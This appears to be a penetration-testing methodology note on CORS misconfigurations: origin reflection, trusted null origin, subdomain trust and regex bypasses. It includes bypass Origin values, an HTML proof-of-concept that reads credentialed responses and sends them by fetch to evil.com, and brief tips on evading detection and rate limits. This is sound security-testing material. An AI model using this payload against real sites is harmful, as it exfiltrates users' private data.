---
description: Cross-Origin Resource Sharing (CORS) misconfigurations methodology. Covers origin reflection, null origin trust, and exploiting credentialed requests.
tags: CORS, Web, Origin Reflection, Cross-Origin
---

# CORS Misconfigurations

CORS is a mechanism that allows restricted resources on a web page to be requested from another domain outside the domain from which the first resource was served. Misconfigurations can lead to sensitive data exposure.

## Recognizing CORS Configurations

Look for the following response headers when sending an `Origin` header:
- `Access-Control-Allow-Origin` (ACAO)
- `Access-Control-Allow-Credentials` (ACAC)

Vulnerable scenarios typically require `ACAC: true` combined with a poorly validated `ACAO` header.

## Common Misconfigurations

### 1. Origin Reflection

The server dynamically reflects whatever is specified in the `Origin` header into the `ACAO` header.
- **Request**: `Origin: https://evil.com`
- **Response**: `Access-Control-Allow-Origin: https://evil.com` and `Access-Control-Allow-Credentials: true`
- **Exploitation**: An attacker can host a malicious script on `evil.com` that sends a cross-origin request to the vulnerable endpoint and reads the response containing sensitive user data.

### 2. The `null` Origin

The server explicitly trusts the `null` origin.
- **Request**: `Origin: null`
- **Response**: `Access-Control-Allow-Origin: null` and `Access-Control-Allow-Credentials: true`
- **Exploitation**: An attacker can use an `iframe` with a `data:` URI or an `iframe` with the `sandbox` attribute to force a request with a `null` origin, bypassing origin checks and reading sensitive data.

### 3. Subdomain Trust & Takeover

The server uses a regex to allow all subdomains (e.g., `*.target.com`).
- **Request**: `Origin: https://sub.target.com`
- **Response**: `Access-Control-Allow-Origin: https://sub.target.com`
- **Exploitation**: If an attacker can find a subdomain takeover vulnerability on any subdomain (e.g., an unclaimed S3 bucket or abandoned DNS record), they can host their malicious CORS payload there.

### 4. Poor Regex Validation

The server improperly validates the origin string.
- If it allows `target.com.evil.com` or `eviltarget.com`.
- **Bypass payloads**:
  - `Origin: https://target.com.evil.com`
  - `Origin: https://target.com%60.evil.com`
  - `Origin: https://target.com%2Eevil.com`
- **Exploitation**: Register the bypass domain and host the payload there.

## Proof of Concept Generation

Create an HTML file to execute the CORS attack and exfiltrate data:

```html
<html>
<body>
  <h2>CORS Exploit</h2>
  <script>
    var req = new XMLHttpRequest();
    req.onload = reqListener;
    req.open('get','https://target.com/api/user_data',true);
    req.withCredentials = true;
    req.send();

    function reqListener() {
        // Exfiltrate the response to attacker server
        fetch('https://evil.com/log?data=' + encodeURIComponent(this.responseText));
    }
  </script>
</body>
</html>
```

## Instructions for usage:
1. When testing APIs, always inject an `Origin: https://evil.com` header.
2. Check if the response includes `Access-Control-Allow-Origin: https://evil.com` and `Access-Control-Allow-Credentials: true`.
3. If the origin is reflected but credentials are not allowed (`ACAC` is missing), the vulnerability might still be exploitable if the API does not require authentication (e.g., extracting public but hidden data) or relies on IP-based authentication (internal networks).
4. If `evil.com` is rejected, try the regex bypass techniques (`eviltarget.com`, `target.com.evil.com`, `null`).

## Advanced Bypass Techniques & Payloads

- **Obfuscation**: Use encoding, chunking, and case variation to bypass signature-based detection.
- **Rate Limit Bypasses**: Rotate IPs via proxies, modify `X-Forwarded-For` headers, or append random parameters to the query string.

- **Author**: **Vivek Chanchal**
